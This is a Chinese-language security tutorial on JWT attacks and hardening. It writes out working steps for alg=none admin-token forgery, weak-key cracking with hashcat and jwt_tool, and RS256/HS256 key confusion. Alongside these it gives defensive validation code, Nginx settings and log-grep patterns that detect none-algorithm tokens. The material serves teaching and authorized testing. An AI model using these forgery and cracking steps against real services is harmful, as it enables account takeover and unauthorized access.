---
order: 330
title: JWT 安全实践
module: 'cybersecurity'
category: 云与基础设施
difficulty: intermediate
description: JWT 安全与加固专篇：生成与解析、算法检测、none 算法伪造、弱密钥爆破、RS256/HS256 密钥混淆攻击、声明校验、安全生成、Nginx 配置、审计监控与安全自检，以「一个 alg=none 伪造管理员」的攻击现场开题。
author: fanquanpp
updated: '2026-10-07'
related:
  - 'cybersecurity/290-AuthenticationAuthorization'
  - 'cybersecurity/310-OAuth2OIDC'
  - 'cybersecurity/050-AsymmetricEncryption'
  - 'cybersecurity/070-PasswordHash'
prerequisites:
  - 'cybersecurity/060-HashAlgorithm'
---

# JWT 安全实践

## 知识点地图

- **知识类别**：身份认证安全——JSON Web Token（JWT）的攻击面与加固操作。JWT 是「服务端签名的 JSON 声明」：头部（Header，声明算法）+ 载荷（Payload，放身份声明）+ 签名（Signature，防篡改），三者用点号相连、前两段 Base64URL 编码。
- **解决什么问题**：JWT 的安全性完全取决于「算法怎么选、密钥强不强、声明校不校验」这三件实现细节，而每一件都有对应的成熟攻击——alg=none 免签名伪造、RS256/HS256 密钥混淆、弱密钥离线爆破、过期时间不校验的永生 Token。本篇把九类操作（生成、解析、检测、爆破、混淆、校验、加固配置、审计、自检）整理成一份可直接执行的清单。
- **什么时候用到**：
  - 给自己项目选型登录态（用 JWT 还是服务端 Session）时，先看攻击面；
  - 渗透测试中拿到一个 Bearer Token，逐项检测目标实现是否踩坑（仅限授权范围内）；
  - code review 认证模块：`algorithms=[...]` 是否显式指定、exp/iss/aud 是否校验、密钥从哪来；
  - 事件响应：从访问日志里筛出可疑 Token 与 none 算法攻击痕迹。
- **与相邻篇目的分工**：认证授权的体系概念（Session 对比 Token、OAuth2 流程）在 [认证与授权](/cybersecurity/290-AuthenticationAuthorization) 与 [OAuth2 与 OIDC](/cybersecurity/310-OAuth2OIDC)；签名所用的 RSA/哈希算法原理在 [非对称加密](/cybersecurity/050-AsymmetricEncryption) 与 [哈希算法](/cybersecurity/060-HashAlgorithm)。本篇只讲 JWT 本身的攻与防。

## 1. 攻击现场：一个 alg=none 就能伪造管理员

先看这次攻击有多廉价。目标服务用 JWT 做登录态，校验代码只解码不验签（或验签函数自动接受 Header 里写的任何算法）。攻击者拿到一个合法 Token 后：

```bash
# 1. 解出 Header，看目标用什么算法
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
# {"alg":"HS256"} —— HMAC，需要密钥才能签名

# 2. 自己伪造一个：算法改成 none，签名留空
python3 -c "import jwt; t=jwt.encode({'user':'admin'}, '', algorithm='none'); print(t)"
# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# 3. 直接提交给目标
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://example.com/api
```

如果目标的后端按 Header 里声明的算法去验签（`alg=none` 意味着「无需验签」），伪造 Token 直接生效——`user: admin` 免费到手。整场攻击不需要密码、不需要密钥，只需要目标犯一个错：**信任了攻击者可控的 Header**。这就是为什么 JWT 安全的第一课是「算法白名单」，也是本篇九节操作的起点。

本文所有「检测」「测试」类操作，前提只有一个：**你在被授权的测试环境或自己的项目里操作**。对未授权系统运行这些命令是违法行为（法律边界见 [IoT 与工控安全](/cybersecurity/580-IoTOTSecurity) 的法规一节）。

## 2. JWT 生成与解析

先学会正常读写，才能谈攻防。生成与解析的三个层级——带验证、无验证调试、纯手工解码：

```bash
# 生成 HS256 算法 JWT Token
python3 -c "import jwt; print(jwt.encode({'user':'admin','exp':1893456000}, 'secretkey', algorithm='HS256'))"

# 解析并验证 JWT Token（验证签名、过期时间）
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', 'secretkey', algorithms=['HS256']))"

# 不验证签名直接解析 Token（仅用于调试，不要用在线上代码里）
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', options={'verify_signature': False}))"

# 手动解码 JWT Payload 部分（cut 取第二段，base64 解码）
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d 2>/dev/null

# 使用 jwt-cli 命令行工具解码
jwt decode eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

讲解与易错点：

- `jwt.decode` **默认验签**且默认校验 `exp`——签名不对或过期都会抛异常，这是库的正确默认值；`options={'verify_signature': False}` 只该出现在「查看载荷内容」的调试脚本里；
- 手工 `base64 -d` 解 Payload 时，JWT 用的是 Base64URL（`-`/`_` 替代 `+`/`/`，且省略 `=` 填充），遇到解码失败先补填充或用支持 URL 字母表的解码器；
- Payload 只是编码不是加密——**任何人都能解开读**，所以「密码、身份证号」绝不能放进 Payload，这条约束在第 7 节「声明校验」里从防御角度再次出现。

## 3. JWT 算法检测：先看目标信什么

```bash
# 查看 JWT 使用的签名算法（Header 第一段解码）
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null

# 提取 JWT Header 不验证签名（Python 库提供的规范入口）
python3 -c "import jwt; print(jwt.get_unverified_header('eyJhbGciOiJIUzI1NiJ9.payload.sig'))"

# 生成 alg=none 的 Token 检测目标是否接受
python3 -c "import jwt; t=jwt.encode({'user':'admin'}, '', algorithm='none'); print(t)"

# 使用 none 算法 Token 测试绕过（授权测试环境内执行）
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://example.com/api
```

检测逻辑是一条因果链：Header 里的 `alg` 字段决定了签名验证方式，而 `alg` 就写在攻击者可改的 Token 里。实现上的漏洞形态有两种——「没指定算法白名单，验签库跟随 Header」（none 攻击直接得手）与「指定了白名单但包含 none」（同罪）。规范的写法是 decode 时显式传 `algorithms=['RS256']` 这样的**定值列表**，让「算法」完全由服务端说了算。

## 4. JWT 弱密钥检测：离线爆破 HS256

HS256 的签名密钥若不够强，攻击者抓到一个 Token 就能**离线**穷举密钥——拿到密钥就能随意签发任何身份的 Token：

```bash
# 使用 jwt_tool 字典爆破 HS256 签名密钥
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.payload.sig -C -d passwords.txt

# 使用 hashcat 模式 16500 爆破 JWT 密钥（GPU 加速）
hashcat -m 16500 eyJhbGciOiJIUzI1NiJ9.payload.sig rockyou.txt

# 使用 John the Ripper 爆破 JWT（先转格式）
python3 jwt2john.py eyJhbGciOiJIUzI1NiJ9.payload.sig > jwt.hash
john jwt.hash --wordlist=passwords.txt

# 测试常见弱密钥 secret/123456 等（直接试解）
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.payload.sig', 'secret', algorithms=['HS256']))"
```

为什么可行：HS256 的验证过程就是「用密钥重算一遍 HMAC 再比对」——你手里有完整的 Token（明文 Payload + 签名），逐个候选密钥重算、比对，命中即恢复密钥。哈希与口令破解的完整工具链在 [Hashcat 与口令破解](/cybersecurity/460-Hashcat) 展开，JWT 爆破只是同一原理（离线可验证 = 可穷举）的一个应用面。防御倒推回来就是：**HS256 密钥至少 32 字节强随机**（第 8 节的 `openssl rand -base64 48`），绝不用 `secret`、`changeme` 这类「文档示例同款」。

## 5. JWT 密钥混淆攻击检测：RS256 转 HS256

比 none 更隐蔽的算法族攻击。目标用 RS256（非对称：私钥签、公钥验），公钥本来就是公开的——攻击者让服务端**误用公钥当 HMAC 密钥**：

```bash
# 从证书提取公钥用于算法混淆检测
openssl x509 -pubkey -noout -in cert.pem > public.pem

# 使用公钥作为 HS256 密钥构造混淆 Token（jwt_tool 一条命令）
python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9.payload.sig -X k -pk public.pem

# 等价的手工构造：公钥文件内容直接作为 HMAC 密钥
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('public.pem').read(), algorithm='HS256'))"

# 使用混淆 Token 测试目标是否接受（授权测试环境内执行）
curl -H "Authorization: Bearer <混淆Token>" https://example.com/api
```

攻击成立的条件：服务端验签代码**跟随 Header 里的 alg 切换验证逻辑**——看到 HS256 就拿「配置里存的那个字符串」（恰好是公钥内容）当 HMAC 密钥。公钥人人可得，于是「需要私钥才能伪造」的防线整条塌掉。防御与 none 攻击同源但更绝对：**decode 时算法白名单写死单一值**，代码里根本不存在「按 alg 分支」这条路，混淆无从谈起。

## 6. JWT 声明校验：签名对了不等于 Token 有效

签名只证明「载荷没被改过」，不证明「载荷声明的事仍然成立」。四项必须校验的声明：

```bash
# 默认会校验 exp 过期字段（库的默认行为，过期抛异常）
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['HS256']))"

# 测试目标是否校验 exp（把过期校验关掉再试解——若目标也关了，永生 Token 成立）
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['HS256'], options={'verify_exp': False}))"

# 校验 JWT 签发者字段 iss（防止别家服务签发的合法 Token 串门）
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', issuer='auth.example.com', algorithms=['HS256']))"

# 校验 JWT 受众字段 aud（防止给 A 服务签的 Token 被 B 服务当真）
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', audience='api.example.com', algorithms=['HS256']))"
```

四个字段各挡一类攻击：`exp` 挡永生 Token（泄露后无限期可用）；`iss` 挡跨签发者混用（多租户/多系统共享密钥时，别家的合法 Token 不能在本系统当真）；`aud` 挡跨服务混用（同一签发者下，给网页端签的 Token 不能直接调内部 API）；加上第 2 节的「Payload 明文可读」， Payload 里不该放敏感数据。测试 `verify_exp: False` 是双刃——它既能验证目标是否校验过期，也提醒你：**关掉任一校验都是明示决定，必须写注释说明理由**。

## 7. JWT 安全生成

```bash
# 生成有效期 1 小时的 Token（exp 为未来时间戳）
python3 -c "import jwt, time; print(jwt.encode({'user':'admin','exp':int(time.time())+3600}, 'secret', algorithm='HS256'))"

# 使用 RSA 私钥生成 RS256 Token
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('private.pem').read(), algorithm='RS256'))"

# 生成 HS256 使用的强随机密钥（48 字节 base64）
openssl rand -base64 48

# 生成带唯一标识 jti 的 Token 防重放
python3 -c "import jwt, uuid; print(jwt.encode({'jti':str(uuid.uuid4()),'user':'admin'}, 'secret', algorithm='HS256'))"
```

五条生成规范，逐条对应前面某节的攻击：

1. **必带 `exp`**，且有效期短（15 分钟到 1 小时）——挡永生 Token（第 6 节）；
2. **算法选 RS256/ES256 优先于 HS256**——非对称签名下密钥泄露面小（公钥公开也无妨）；坚持 HS256 则密钥必须 `openssl rand` 生成、32 字节以上（第 4 节）；
3. **`jti`（JWT ID）加唯一标识**，服务端记录已使用的 jti——短有效期挡不住「拿到立刻重放」，jti + 服务端黑名单才是完整答案；
4. **敏感数据不进 Payload**——它只是编码；
5. **签发与验证用同一份白名单常量**，不要两处代码各自传参。

## 8. JWT 安全配置（Nginx）

网关层的四项配置，让非法请求死在应用之前：

```nginx
# Nginx 校验 Authorization 头格式（非 Bearer 开头直接 401）
if ($http_authorization !~ "^Bearer ") {
    return 401;
}

# 反向代理转发 Authorization 头（默认会丢，后端拿不到就全变游客）
proxy_set_header Authorization $http_authorization;

# 限制请求头大小，防止超大 Token（恶意膨胀的 Payload）打爆解析
client_header_buffer_size 4k;
large_client_header_buffers 4 8k;

# 使用子请求校验 JWT（由鉴权服务决定放行与否）
location /api {
    auth_request /auth;
}
location = /auth {
    proxy_pass http://auth_service/verify;
}
```

讲解：

- 第一条是**格式门卫**——连 Bearer 前缀都没有的请求不必惊动后端；注意 `if` 在 Nginx location 里的语义陷阱（写错位置会生效异常），生产配置建议放 server 级或用 `map`；
- 第二条最常被漏：`proxy_pass` 默认**不透传** Authorization，忘写这行，「网关验过了、后端拿不到用户身份」的诡异现场就来了；
- `auth_request` 把「验签 + 声明校验」集中到鉴权服务——所有应用共享一套校验逻辑，避免每个服务各自实现时漏掉白名单。这与 [Web 安全纵深](/cybersecurity/280-WebSecurityDeep) 的「统一入口防御」思想一致。

## 9. JWT 审计与监控

```bash
# 从日志中提取所有 JWT Token（JWT 三段式的正则特征）
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" /var/log/nginx/access.log

# 统计各 Token 使用频率检测异常（同一 Token 高频来自多 IP = 疑似被盗用）
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" /var/log/nginx/access.log | sort | uniq -c | sort -rn | head

# 检测使用 none 算法的攻击 Token（none 的 Header base64 特征）
grep -i "eyJhbGciOiJub25lIn0\|eyJhbGciOiJub25lI" /var/log/nginx/access.log

# 实时监控 JWT 相关请求
tail -f /var/log/nginx/access.log | grep -i "bearer\|jwt\|eyJ"
```

审计的三个抓手：**提取**（所有 JWT 以 `eyJ` 开头——`{"` 的 Base64，正则可稳定识别）、**频率**（正常用户不会一秒发一百个请求；同一 Token 突然出现在陌生 IP 是账号被盗的典型信号）、**特征**（`alg:none` 的 Header 编码是固定字符串，一条 grep 全网扫描）。日志体系化建设（集中、留存、告警联动）在 [安全运营与 SOC](/cybersecurity/550-SOC) 展开，这里是 JWT 单点的最小操作。

## 10. JWT 安全自检

上线前与 code review 时的十项自检清单：

```bash
# 1. 检查 JWT 签名密钥长度是否足够（建议 32 字节以上）
echo -n "secretkey" | wc -c

# 2. 检查 Token 是否使用 HS256/RS256 而非 none
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null

# 3. 检查代码是否显式指定允许的算法（搜不到 = 验签库跟随 Header，高危）
grep -rn "algorithms=\[" src/

# 4. 批量检查 Token 配置（算法与类型）
python3 -c "import jwt; h=jwt.get_unverified_header('eyJ...'); print('算法:', h.get('alg')); print('类型:', h.get('typ'))"
```

加上代码层面的六问，凑齐十项：

5. decode 是否显式传 `algorithms=[...]` 白名单（防 none 与混淆，第 3、5 节）；
6. `exp`/`iss`/`aud` 是否全部校验（第 6 节）；
7. HS256 密钥是否来自环境变量/密钥管理而非硬编码（第 4 节）；
8. 是否有 jti 或黑名单机制支撑「登出即失效」（第 7 节）；
9. Payload 是否只放非敏感声明（第 2 节）；
10. 网关层是否做了 Bearer 格式校验与头大小限制（第 8 节）。

每一问都能对应到前文某节的具体命令——这份清单的价值就在「每一条可执行、可验收」，而不是一句「注意安全」。

## 11. 动手实践

### 练习一：亲手复现 none 攻击（在自己的测试服务上）

任务：用任意支持 JWT 的最小 demo（如 Flask + PyJWT，20 行）搭一个「decode 不传 algorithms」的接口，然后按第 1 节的三步复现 alg=none 伪造；再加一行白名单修复它，重新验证攻击失效。
提示：PyJWT 新版本对 `alg=none` 已有防护（显式要求 `algorithms` 参数），复现旧漏洞可自写「手工 split + base64 解码 + 自行验签」的 30 行脚本——这 30 行能让你看清验签到底在验什么。

参考思路（先自己搭，再看要点）：漏洞形态是「`jwt.decode(token, key)` 不带 algorithms 参数 + 旧版库默认信任 Header」；修复是 `jwt.decode(token, key, algorithms=['HS256'])`。修复后再跑第 1 节的 curl，应当得到 401。

### 练习二：给 FANDEX 这类开源项目做 JWT 选型评审

任务：假设 FANDEX 要加登录态，写一份 10 行以内的选型备忘：JWT 还是服务端 Session？若选 JWT，列出本篇十项自检里必须写进 code review checklist 的前三条，并说明理由。
提示：静态站点没有服务端会话的常态诉求；一旦引入 API 后端，「多服务共享身份」才轮到 JWT 的主场。checklist 前三候选：算法白名单、exp 校验、密钥来源。

参考思路（先自己想，再看）：无状态多服务场景选 JWT + RS256；单应用场景 Session 更简单（服务端一张表就完成「登出即失效」，JWT 做不到）。checklist 前三：`algorithms=[...]` 显式白名单（挡 none 与混淆两族攻击）、`exp` 短有效期校验、密钥走环境变量。

### 练习三（工程场景）：写一个 Token 巡检脚本

任务：把第 10 节的命令组装成一个 shell 脚本 `jwt_audit.sh <日志文件>`：输出「Token 总数、none 算法命中数、使用频率 Top3」，none 命中时退出码为 1（方便挂进 CI 或 cron）。
提示：三个 grep/管道已在第 9 节给出，剩下的是「聚合成脚本 + 退出码约定」；注意 `set -e` 与 grep 无匹配返回 1 的相互作用。

参考实现（先自己写，写完再对照）：

```bash
#!/usr/bin/env bash
# jwt_audit.sh <access.log> —— JWT 使用巡检
log="${1:?用法: jwt_audit.sh <日志文件>}"

total=$(grep -coE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" "$log" || true)
none_hits=$(grep -ci "eyJhbGciOiJub25lI" "$log" || true)
echo "Token 总数: $total"
echo "none 算法命中: $none_hits"
echo "使用频率 Top3:"
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" "$log" | sort | uniq -c | sort -rn | head -3

[ "$none_hits" -eq 0 ] || exit 1
```

（`|| true` 是为了让 grep 零匹配不中断脚本；退出码 1 供 cron/CI 判定告警。）

## 12. 与之前和之后的知识的关系

- 往前：[哈希算法](/cybersecurity/060-HashAlgorithm) 与 [非对称加密](/cybersecurity/050-AsymmetricEncryption) 解释签名与 HMAC 的数学底座；[认证与授权](/cybersecurity/290-AuthenticationAuthorization) 的 Session/Token 对比是选型的出发点；
- 旁支：[OAuth2 与 OIDC](/cybersecurity/310-OAuth2OIDC) 里 OIDC 的 id_token 就是一枚 JWT——本篇的校验规则原样适用；[Hashcat 与口令破解](/cybersecurity/460-Hashcat) 的离线破解原理覆盖第 4 节的密钥爆破；
- 往后：发现 Token 泄露后的处置流程（吊销、审计、复盘）在 [应急响应](/cybersecurity/560-IncidentResponse)；网关统一防御在 [Web 安全纵深](/cybersecurity/280-WebSecurityDeep)。

## 13. 官方文档

- RFC 8725：JWT 安全最佳实践（IETF，算法白名单与混淆攻击的权威出处）：https://datatracker.ietf.org/doc/html/rfc8725
- RFC 7519：JSON Web Token (JWT)：https://datatracker.ietf.org/doc/html/rfc7519
- PyJWT 文档（算法参数与默认校验行为）：https://pyjwt.readthedocs.io/
- jwt-cli：https://github.com/mike-engel/jwt-cli
- OWASP JWT Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

## 14. 自我检查

- 能画出 JWT 的三段结构，并解释为什么 Payload 是「编码」不是「加密」；
- 能复述 alg=none 攻击的三个步骤，并说出唯一可靠的防御（decode 显式算法白名单）；
- 能解释 RS256 转 HS256 混淆攻击为什么「公钥公开」反而成为攻击材料；
- 能说出 exp/iss/aud 各挡哪类攻击，以及 jti 解决 exp 挡不住的哪个残留问题；
- 拿到一份待 review 的认证代码，能按第 10 节十项清单逐条过检。

## 本章总结

JWT 的安全边界由三行实现代码决定：验签函数怎么选算法（白名单挡 none 与 RS256/HS256 混淆）、密钥从哪来（强随机 32 字节起，挡离线爆破）、声明校不校验（exp/iss/aud/jti 挡永生与重放与串用）。攻击侧的顺序是「解析 Header 看算法、试 none 与混淆两类伪造、离线爆破弱密钥」；防御侧的顺序是「算法白名单写死、密钥管理规范、声明全量校验、网关格式门卫、日志审计兜底」。记住第 1 节那个现场：一个不需要任何密钥的 Token 就能当上管理员——所有规范，都是为了不让这一幕发生。

## 参考与致谢

- 本文第 2 至 10 节的操作命令体系（生成/解析/算法检测/弱密钥检测/密钥混淆/声明校验/安全生成/Nginx 配置/审计监控/安全自检）整体承接自本仓库 [安全基础与防御](/cybersecurity/010-SecurityBasicsDefense) 原 JWT 系列（内部内容重组，并补写讲解与易错点）；
- 算法族攻击（none、RS256/HS256 混淆）的标准描述依据 IETF RFC 8725 与 OWASP Cheat Sheet（公开标准/开放许可）；
- 其余讲解文本为原创。
